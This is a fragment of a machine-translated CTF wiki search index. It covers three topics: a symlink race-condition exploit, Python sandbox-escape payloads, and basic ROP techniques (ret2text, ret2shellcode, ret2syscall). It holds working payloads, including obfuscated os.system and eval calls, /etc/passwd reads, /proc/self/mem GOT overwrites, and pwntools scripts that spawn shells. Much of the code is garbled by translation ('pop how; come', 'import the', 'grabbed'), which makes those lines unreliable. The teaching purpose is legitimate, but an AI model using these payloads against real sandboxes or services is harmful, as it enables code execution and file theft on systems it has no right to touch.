fake\n\n    ln -s big fake\n\n    rm fake\n\ndone\n\nRun race test cat run.sh\n#! / Bin / sh\nfor i in `seq 1000`\n\ndo\n\n    ./test fake\n\ndone\n</code></pre> <p>Where exp is used to compete to delete the fake file in the corresponding window while performing symbolic links. Run is used to execute the program.</p>"},{"location":"pwn/linux/race-condition/problem/#specific-effects","title":"Specific effects","text":"<pre><code>\u279c race test (sh exp.sh &amp;amp;) &amp;amp;&amp;amp; sh run.sh\n[...]\n\nfile size is too large!!\n\nopen file failed!!: No such file or directory\n\nopen file failed!!: No such file or directory\n\nopen file failed!!: No such file or directory\n\nopen file failed!!: No such file or directory\n\nfile size is too large!!\n\nopen file failed!!: No such file or directory\n\nopen file failed!!: No such file or directory\n\nflag{race_condition_succeed!}\n\n[...]\n</code></pre> <p>The key to success is the timing of the corresponding <code>sleep</code>.</p>"},{"location":"pwn/linux/race-condition/problem/#_2","title":"\u53c2\u8003","text":"<ul> <li> <p>http://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html</p> </li> <li> <p>http://www.cnblogs.com/huxiao-tee/p/4660352.html</p> </li> <li>https://github.com/dirtycow/dirtycow.github.io</li> </ul>"},{"location":"pwn/linux/sandbox/python-sandbox-escape/","title":"Python sandbox","text":"<p>The so-called Python sandbox, in a certain way to simulate the Python terminal, to achieve user use of Python.</p>"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#python-sandbox-escape-some-ways","title":"Python Sandbox Escape Some Ways","text":"<p>What we usually call Python sandbox escaping is to bypass the simulated Python terminal and ultimately implement command execution.</p>"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#import-module","title":"Import module","text":"<p>In Python's built-in functions, there are some functions that help us implement arbitrary command execution: <pre><code>os.system () os.popen ()\ncommands.getstatusoutput() commands.getoutput()\n\ncommands.getstatus()\n\nsubprocess.call(command, shell=True) subprocess.Popen(command, shell=True)\n\npty.spawn()\n</code></pre></p> <p>There are usually three ways to import modules in Python (xxx is the module name):</p> <ol> <li> <p><code>import xxx</code></p> </li> <li> <p><code>from xxx import *</code></p> </li> <li> <p><code>__import__('xxx')</code></p> </li> </ol> <p>We can import the relevant modules through the above import method and use the above functions to implement the command execution. In addition to this, we can also ** import modules via path**: For example, in Linux system, the path of Python's os module is generally in <code>/usr/lib/python2.7/os.py</code>. When you know the path, we can import the module by the following operations, and then further use the relevant function. <pre><code>&gt;&gt;&gt; import sys\n\n&gt;&gt;&gt; sys.modules['os']='/usr/lib/python2.7/os.py'\n\n&amp;gt;&amp;gt;&amp;gt; import the\n&gt;&gt;&gt;\n</code></pre></p> <p>Other dangerous function examples Such as execfile file execution <pre><code>&gt;&gt;&gt; execfile('/usr/lib/python2.7/os.py')\n\n&gt;&gt;&gt; system('cat /etc/passwd')\n\nroot:x:0:0:root:/root:/bin/bash\n\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\n\n...\n\n&gt;&gt;&gt; getcwd()\n\n'/usr/lib/python2.7'\n</code></pre></p> <p>** ** timeit <pre><code>import timeit\n\ntimeit.timeit(\"__import__('os').system('dir')\",number=1)\n</code></pre></p> <p>** exec and eval are more classic ** <pre><code>eval('__import__(\"os\").system(\"dir\")')\n</code></pre></p> <p>platform</p> <pre><code>import platform\n\nprint platform.popen('dir').read()\n</code></pre> <p>However, the normal Python sandbox will blacklist the use of modules such as os or whitelists that only allow users to use the sandbox-provided modules to prevent dangerous operations. How to further escape the sandbox is our key research content.</p>"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#pythons-built-in-functions","title":"Python's built-in functions","text":"<p>When we can't import modules, or the modules we want to import are banned, then we can only look for Python's own built-in functions (that is, functions that are usually imported without default, and Python itself has been imported by default). We can get a list of built-in functions by using <code>dir __builtin__</code> <pre><code>&amp;gt;&amp;gt;&amp;gt; say (__ builtins__)\n['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BufferError', 'BytesWarning', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'NameError', 'None', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'ReferenceError', 'RuntimeError', 'RuntimeWarning', 'StandardError', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '_', '__debug__', '__doc__', '__import__', '__name__', '__package__', 'abs', 'all', 'any', 'apply', 'basestring', 'bin', 'bool', 'buffer', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'cmp', 'coerce', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'execfile', 'exit', 'file', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'intern', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'long', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'raw_input', 'reduce', 'reload', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'unichr', 'unicode', 'vars', 'xrange', 'zip']\n</code></pre></p> <p>In Python, built-in functions that do not introduce direct use are called builtin functions, and are automatically introduced into the environment with the _builtin__ module. So how do we introduce the module? We can introduce the modules we want to introduce by dict. The role of dict is to list all the properties and functions below a module/class/object. This is useful in sandbox escapes, you can find some things hidden in it. dictWhat can I do? We know that a module object has a namespace implemented by a dictionary object, and a reference to the property is converted to a lookup in the dictionary. For example, mx is equivalent to m.dict[\"x\"].</p> <p>Bypass the instance: First pass the base64 bypass character plaintext detection <pre><code>&gt;&gt;&gt; import base64\n\n&gt;&gt;&gt; base64.b64encode('__import__')\n\n'X19pbXBvcnRfXw=='\n\n&amp;gt;&amp;gt;&amp;gt; base64.b64encode (&amp;#39;os&amp;#39;)\n&amp;#39;b3M =&amp;#39;\n</code></pre></p> <p>Then quoted by dict <pre><code>&gt;&gt;&gt; __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))\n</code></pre></p> <ul> <li>If some introverted functions are removed in builtins, we can reload them by reload(builtins) to get a complete builtins*</li> </ul>"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#creating-objects-and-references","title":"Creating objects and references","text":"<p>There are a lot of basic functions integrated in Python's object class, and we can also refer to it by creating objects when we want to call them.</p> <p>We have two common methods: <pre><code>().__class__.__bases__[0]\n\n''.__class__.__mro__[2]\n</code></pre></p> <p></p> <p>For example, we can pass <code>print ().__class__.__bases__[0].__subclasses__()[40](&amp;quot;/etc/services&amp;quot;).read()</code> achieves the effect of file reading,</p> <p>Common payload <pre><code>#\u8bfb\u6587\u4ef6\n().__class__.__bases__[0].__subclasses__()[40](r'C:\\1.php').read()\n\n\n\n#Write file\n().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')\n\n\n\n#Execute arbitrary commands\n() .__ class __.__ bases __ [0] .__ subclasses __ () [59] .__ init __. func_globals.values () [13] [&amp;#39;eval&amp;#39;] (&amp;#39;__ import __ (&amp;quot;os&amp;quot;). popen (&amp;quot;ls / var / www / html &amp;quot;). read () &amp;#39;)\n</code></pre></p>"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#indirect-reference","title":"Indirect reference","text":"<p>In some topics, such as the Python sandbox issue of the 2018 National Tournament, the import is actually castrated. But in Python, the native import is referenced, as long as we find the relevant object reference, we can further get what we want, the following demo will tell you</p>"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#writemodify-got-table","title":"writeModify got table","text":"<p>Is actually a memory operation method of /proc/self/mem /proc/self/mem is a memory image that can be used to read and write all the memory of the process, including executable code. If we can get the offset of some functions of Python, such as system, We can then override the purpose of getshell by overriding the got. <pre><code>(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('c'+'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))\n</code></pre></p> <p>The first address is the offset of system, the second is the offset of fopen, we can get the relevant information through objdump </p>"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#example2018-ciscn-python-sandbox-escape-in-the-national-university-information-security-competition","title":"example2018 ciscn Python sandbox escape in the National University Information Security Competition.","text":"<p>We can get the title source by <code>print ().__class__.__bases__[0].__subclasses__()[40](&amp;quot;/home/ctf/sandbox.py&amp;quot;).read()</code>, and then we can further analyze it. An escape method.</p>"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#creating-objects-and-using-python-to-manipulate-string-characteristics","title":"Creating objects and using Python to manipulate string characteristics","text":"<pre><code>x = [x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'ca'+'tch_warnings'][0].__init__\n\nx.__getattribute__(\"func_global\"+\"s\")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s')\n\nx.__getattribute__(\"func_global\"+\"s\")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s /home/ctf')\n\nx.__getattribute__(\"func_global\"+\"s\")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ca'+'t /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb')\n</code></pre>"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#hijack-got-table-getshell","title":"Hijack got table getshell","text":"<pre><code>(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('l'+'s /home/ctf/'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))\n\n\n\n\n\n(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('c'+'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))\n</code></pre>"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#looking-for-an-indirect-reference-to-import","title":"Looking for an indirect reference to import","text":"<p>In the continuous dir process, I found that closure this object saves the parameters, you can refer to the native import <pre><code>print __import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('l'+'s home') \n</code></pre></p>"},{"location":"pwn/linux/sandbox/python-sandbox-escape/#_1","title":"\u53c2\u8003","text":"<p>https://xz.aliyun.com/t/52#toc-10 </p> <p>https://blog.csdn.net/qq_35078631/article/details/78504415 </p> <p>https://www.anquanke.com/post/id/85571 </p> <p>http://bestwing.me/2018/05/03/awesome-python-sandbox-in-ciscn/#0x01</p>"},{"location":"pwn/linux/stackoverflow/basic-rop/","title":"\u57fa\u672cROP","text":"<p>With the NX protection turned on, it is difficult to continue to directly inject code directly into the stack or heap. Attackers have also proposed corresponding methods to bypass protection. At present, the main one is ROP (Return Oriented Programming). The main idea is to use the existing small fragments in the program based on the ** stack buffer overflow. ) to change the value of some registers or variables to control the execution flow of the program. **The so-called gadgets are sequences of instructions ending in ret. Through these sequences of instructions, we can modify the contents of certain addresses to facilitate the control program execution process.</p> <p>It is called ROP because the core is to use the ret instruction in the instruction set to change the order in which the instruction stream is executed. ROP attacks generally have to satisfy the following conditions</p> <ul> <li> <p>The program has an overflow and can control the return address.</p> </li> <li> <p>You can find the gadgets that meet the criteria and the address of the corresponding gadgets.</p> </li> </ul> <p>If the address of the gadgets is not fixed every time, then we need to find a way to dynamically get the corresponding address.</p>"},{"location":"pwn/linux/stackoverflow/basic-rop/#ret2text","title":"ret2text","text":""},{"location":"pwn/linux/stackoverflow/basic-rop/#principle","title":"Principle","text":"<p>Ret2text is the code (.text) that the control program executes the program itself. In fact, this method of attack is a general description. When we control the existing code of the execution program, we can also control the program to execute several pieces of code (that is, gadgets) of non-adjacent programs. This is what we want to say about ROP.</p> <p>At this point, we need to know the location of the corresponding returned code. Of course, the program may also open some protection, we need to find a way to bypass these protections.</p>"},{"location":"pwn/linux/stackoverflow/basic-rop/#examples","title":"Examples","text":"<p>In fact, in the basic principle of stack overflow, we have introduced this simple attack. Here, let's give another example, the example of ret2text used in Bamboofox to introduce ROP.</p> <p>\u70b9\u51fb\u4e0b\u8f7d: ret2text</p> <p>First, check out the protection mechanism of the program.</p> <pre><code>\u279c  ret2text checksec ret2text\n\n    Arch:     i386-32-little\n\n    RELRO:    Partial RELRO\n\n    Stack:    No canary found\n\n    NX:       NX enabled\n\n    PIE:      No PIE (0x8048000)\n</code></pre> <p>It can be seen that the program is a 32-bit program that only turns on stack unexecutable protection. Then we use IDA to view the source code.</p> <pre><code>int __cdecl main(int argc, const char **argv, const char **envp)\n\n{\n\n  int v4; // [sp+1Ch] [bp-64h]@1\n\n\n\n  setvbuf(stdout, 0, 2, 0);\n\n  setvbuf(_bss_start, 0, 1, 0);\n\n  puts(\"There is something amazing here, do you know anything?\");\n\ngets ((char *) &amp;amp; v4);\n  printf(\"Maybe I will tell you next time !\");\n\n  return 0;\n\n}\n</code></pre> <p>It can be seen that the program uses the gets function in the main function, and obviously there is a stack overflow vulnerability. Later discovered</p> <p><code>`</code>asm .text:080485FD secure          proc near</p> <p>.text:080485FD</p> <p>.text:080485FD input           = dword ptr -10h</p> <p>.text:080485FD secretcode      = dword ptr -0Ch</p> <p>.text:080485FD</p> <p>.text:080485FD                 push    ebp</p> <p>.text:080485FE                 mov     ebp, esp</p> <p>.text:08048600                 sub     esp, 28h</p> <p>.text:08048603                 mov     dword ptr [esp], 0 ; timer</p> <p>.text:0804860A                 call    _time</p> <p>.text:0804860F                 mov     [esp], eax      ; seed</p> <p>.text:08048612                 call    _srand</p> <p>.text:08048617                 call    _rand</p> <p>.text:0804861C                 mov     [ebp+secretcode], eax</p> <p>.text:0804861F                 lea     eax, [ebp+input]</p> <p>.text:08048622                 mov     [esp+4], eax</p> <p>.text:08048626                 mov     dword ptr [esp], offset unk_8048760</p> <p>.text:0804862D                 call    ___isoc99_scanf</p> <p>.text:08048632                 mov     eax, [ebp+input]</p> <p>.text:08048635                 cmp     eax, [ebp+secretcode]</p> <p>.text:08048638                 jnz     short locret_8048646</p> <p>.text:0804863A                 mov     dword ptr [esp], offset command ; \"/bin/sh\"</p> <p>.text:08048641                 call    _system</p> <pre><code>In the secure function, it is found that there is code calling system(&amp;quot;/bin/sh&amp;quot;), then if we directly control the program to return to 0x0804863A, then we can get the system shell.\n\n\nHere&amp;#39;s how we construct the payload. The first thing we need to determine is the number of bytes from the start address of the memory we can control from the return address of the main function.\n\n\n`` `asm\n.text:080486A7                 lea     eax, [esp+1Ch]\n\n.text:080486AB                 mov     [esp], eax      ; s\n\n.text:080486AE                 call    _gets\n</code></pre> <p>You can see that the string is indexed relative to esp, so we need to debug, put the breakpoint at the call, view esp, ebp, as follows</p> <pre><code>gef\u27a4  b *0x080486AE\n\nBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.\n\ngef\u27a4  r\n\nThere is something amazing here, do you know anything?\n\n\n\nBreakpoint 1, 0x080486ae in main () at ret2text.c:24\n\n24      gets(buf);\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ registers ]\u2500\u2500\u2500\u2500\n\n$eax   : 0xffffcd5c  \u2192  0x08048329  \u2192  \"__libc_start_main\"\n\n$ebx   : 0x00000000\n\n$ ecx: 0xffffffff\n$edx   : 0xf7faf870  \u2192  0x00000000\n\n$esp   : 0xffffcd40  \u2192  0xffffcd5c  \u2192  0x08048329  \u2192  \"__libc_start_main\"\n\n$ebp   : 0xffffcdc8  \u2192  0x00000000\n\n$ you are: 0xf7fae000 \u2192 0x001b1db0\n$ edi: 0xf7fae000 \u2192 0x001b1db0\n$ Eip: 0x080486ae \u2192 &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;\n</code></pre> <p>You can see that esp is 0xffffcd40, ebp is the specific payload as follows 0xffffcdc8, and the index of s relative to esp is [esp+0x1c], so the address of s is 0xffffcd5c, so the offset of s relative to ebp is 0x6C, so the relative The offset from the return address is 0x6c+4.</p> <p>The final payload is as follows:</p> <pre><code>##!/usr/bin/env python\n\nfrom pwn import *\n\n\n\nsh = process('./ret2text')\n\ntarget = 0x804863a\n\nsh.sendline('A' * (0x6c+4) + p32(target))\n\nsh.interactive()\n</code></pre>"},{"location":"pwn/linux/stackoverflow/basic-rop/#ret2shellcode","title":"ret2shellcode","text":""},{"location":"pwn/linux/stackoverflow/basic-rop/#principle_1","title":"Principle","text":"<p>Ret2shellcode, which controls the program to execute shellcode code. Shellcode refers to the assembly code used to complete a function. The common function is to get the shell of the target system. ** In general, shellcode needs to be populated by ourselves. This is actually another typical use, that is, we need to fill in some executable code** at this time.</p> <p>On the basis of the stack overflow, in order to execute the shellcode, the corresponding binary is required at runtime, and the area where the shellcode is located has executable permissions.</p>"},{"location":"pwn/linux/stackoverflow/basic-rop/#examples_1","title":"Examples","text":"<p>Here we take ret2shellcode in bamboofox as an example.</p> <p>\u70b9\u51fb\u4e0b\u8f7d: ret2shellcode</p> <p>First check the protection of the program open</p> <pre><code>\u279c  ret2shellcode checksec ret2shellcode\n\n    Arch:     i386-32-little\n\n    RELRO:    Partial RELRO\n\n    Stack:    No canary found\n\n    NX:       NX disabled\n\n    PIE:      No PIE (0x8048000)\n\n    RWX:      Has RWX segments\n</code></pre> <p>It can be seen that the source program has almost no protection turned on, and is readable, writable, and executable. Let's look at the program again using IDA.</p> <pre><code>int __cdecl main(int argc, const char **argv, const char **envp)\n\n{\n\n  int v4; // [sp+1Ch] [bp-64h]@1\n\n\n\n  setvbuf(stdout, 0, 2, 0);\n\n  setvbuf(stdin, 0, 1, 0);\n\n  puts(\"No system for you this time !!!\");\n\ngets ((char *) &amp;amp; v4);\n  strncpy(buf2, (const char *)&amp;v4, 0x64u);\n\n  printf(\"bye bye ~\");\n\n  return 0;\n\n}\n</code></pre> <p>It can be seen that the program is still a basic stack overflow vulnerability, but this time also copy the corresponding string to buf2. A simple view shows that buf2 is in the bss section.</p> <p><code>`</code>asm .bss:0804A080                 public buf2</p> <p>.bss:0804A080 ; char buf2[100]</p> <pre><code>At this point, we simply debug the program to see if this bss section is executable.\n\n\n```shell\n\ngef\u27a4  b main\n\nBreakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.\n\ngef\u27a4  r\n\nStarting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode \n\n\n\nBreakpoint 1, main () at ret2shellcode.c:8\n\n8       setvbuf(stdout, 0LL, 2, 0LL);\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ source:ret2shellcode.c+8 ]\u2500\u2500\u2500\u2500\n\n      6  int main(void)\n\n      7  {\n\n \u2192    8      setvbuf(stdout, 0LL, 2, 0LL);\n\n      9      setvbuf(stdin, 0LL, 1, 0LL);\n\n     10  \n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500\n\n[#0] 0x8048536 \u2192 Name: main()\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\ngef\u27a4  vmmap \n\nStart      End        Offset     Perm Path\n\n0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n\n0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n\n0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n\n0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\n\n0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so\n\n0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so\n\n0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so\n\n0xf7faf000 0xf7fb2000 0x00000000 rwx \n\n0xf7fd3000 0xf7fd5000 0x00000000 rwx \n\n0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]\n\n0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]\n\n0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\n\n0xf7ffb000 0xf7ffc000 0x00000000 rwx \n\n0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so\n\n0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so\n\n0xfffdd000 0xffffe000 0x00000000 rwx [stack]\n</code></pre> <p>Through vmmap, we can see that the segment corresponding to the bss segment has executable permissions.</p> <pre><code>0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n</code></pre> <p>So this time we control the program to execute the shellcode, which is to read the shellcode, and then control the program to execute the shellcode at the bss section. Among them, the corresponding offset calculation is similar to the example in ret2text.</p> <p>The specific payload is as follows</p> <pre><code>#!/usr/bin/env python\n\nfrom pwn import *\n\n\n\nsh = process('./ret2shellcode')\n\nshellcode = asm (shellcraft.sh ())\nbuf2_addr = 0x804a080\n\n\n\nsh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))\n\nsh.interactive()\n</code></pre>"},{"location":"pwn/linux/stackoverflow/basic-rop/#title","title":"Title","text":"<ul> <li>sniperoj-pwn100-shellcode-x86-64</li> </ul>"},{"location":"pwn/linux/stackoverflow/basic-rop/#ret2syscall","title":"ret2syscall","text":""},{"location":"pwn/linux/stackoverflow/basic-rop/#principle_2","title":"Principle","text":"<p>Ret2syscall, that is, the control program executes the system call and gets the shell.</p>"},{"location":"pwn/linux/stackoverflow/basic-rop/#examples_2","title":"Examples","text":"<p>Here we take ret2syscall in bamboofox as an example.</p> <p>\u70b9\u51fb\u4e0b\u8f7d: ret2syscall</p> <p>First check the protection of the program open</p> <pre><code>\u279c  ret2syscall checksec rop\n\n    Arch:     i386-32-little\n\n    RELRO:    Partial RELRO\n\n    Stack:    No canary found\n\n    NX:       NX enabled\n\n    PIE:      No PIE (0x8048000)\n</code></pre> <p>It can be seen that the source program is 32-bit and NX protection is turned on. Next use IDA to view the source code</p> <pre><code>int __cdecl main(int argc, const char **argv, const char **envp)\n\n{\n\n  int v4; // [sp+1Ch] [bp-64h]@1\n\n\n\n  setvbuf(stdout, 0, 2, 0);\n\n  setvbuf(stdin, 0, 1, 0);\n\n  puts(\"This time, no system() and NO SHELLCODE!!!\");\n\n  puts(\"What do you plan to do?\");\n\n  gets(&amp;v4);\n\n  return 0;\n\n}\n</code></pre> <p>It can be seen that this is still a stack overflow. Similar to the previous approach, we can get the offset of v4 relative to ebp to 108. So the return address we need to override is 112 relative to v4. This time, because we can't directly use a piece of code in the program or fill in the code to get the shell, we use the gadgets in the program to get the shell, and the corresponding shell acquisition uses the system call. For knowledge about system calls, please refer to</p> <ul> <li>https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</li> </ul> <p>To put it simply, as long as we put the parameters of the system call corresponding to the get shell into the corresponding registers, we can execute the corresponding system call by executing int 0x80. For example, here we use the following system call to get the shell</p> <pre><code>execve(\"/bin/sh\",NULL,NULL)\n</code></pre> <p>Among them, the program is 32 bit, so we need to make</p> <ul> <li>System call number, ie eax should be 0xb</li> <li>The first parameter, ebx, should point to the address of /bin/sh. In fact, the address of sh can be executed.</li> <li>The second parameter, ecx should be 0</li> <li>the third parameter, edx should be 0</li> </ul> <p>And how do we control the values of these registers? Here you need to use gadgets. For example, if the top of the stack is now 10, then if pop eax is executed at this time, the value of eax is now 10. But we can't expect a continuous code to control the corresponding registers at the same time, so we need a piece of control, which is why we use ret at the end of the gadgets to control the execution flow again. To find out how to use gadgets, we can use the ropgadgets tool.</p> <p>First, let's look for gadgets that control eax.</p> <pre><code>\u279c ret2syscall ROPgadget --binary call --only &amp;#39;pop | right&amp;#39; | grabbed &amp;#39;eax&amp;#39;\n0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret\n\n0x080bb196 : pop eax ; ret\n\n0x0807217a : pop eax ; ret 0x80e\n\n0x0804f704 : pop eax ; ret 3\n\n0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret\n</code></pre> <p>You can see that all of the above can control eax, and I choose the second one as the gadgets.</p> <p>Similarly, we can get gadgets that control other registers.</p> <pre><code>\u279c ret2syscall ROPgadget --binary call --only &amp;#39;pop | right&amp;#39; | grab &amp;#39;ebx&amp;#39;\n0x0809dde2: pop ds; pop ebx; pop esi; pop edi; ret\n0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret\n\n0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret\n\n0x0809e1d4: pop ebx; pop ebp; pop how; come; ret\n0x080be23f : pop ebx ; pop edi ; ret\n\n0x0806eb69 : pop ebx ; pop edx ; ret\n\n0x08092258 : pop ebx ; pop esi ; pop ebp ; ret\n\n0x0804838b: pop ebx; pop how; come; pop ebp; ret\n0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10\n\n0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14\n\n0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc\n\n0x0805ae81: pop ebx; pop how; come; pop ebp; ret 4\n0x08049bfd: pop ebx; pop esi; pop edi; pop ebp; ret 8\n0x08048913: pop ebx; pop how; come; ret\n0x08049a19: pop ebx; pop how; come; ret 4\n0x08049a94 : pop ebx ; pop esi ; ret\n\n0x080481c9: pop ebx; right\n0x080d7d3c : pop ebx ; ret 0x6f9\n\n0x08099c87 : pop ebx ; ret 8\n\n0x0806eb91 : pop ecx ; pop ebx ; ret\n\n0x0806336b: come up; pop how; pop ebx; ret\n0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret\n\n0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret\n\n0x0806eb68: pop esi; pop ebx; pop edx; right\n0x0805c820, pop esi; pop ebx; ret\n0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n\n0x0807b6ed : pop ss ; pop ebx ; ret\n</code></pre> <p>Here, I choose</p> <pre><code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret\n</code></pre> <p>This can directly control the other three registers.</p> <p>In addition, we need to get the address corresponding to the /bin/sh string.</p> <pre><code>\u279c  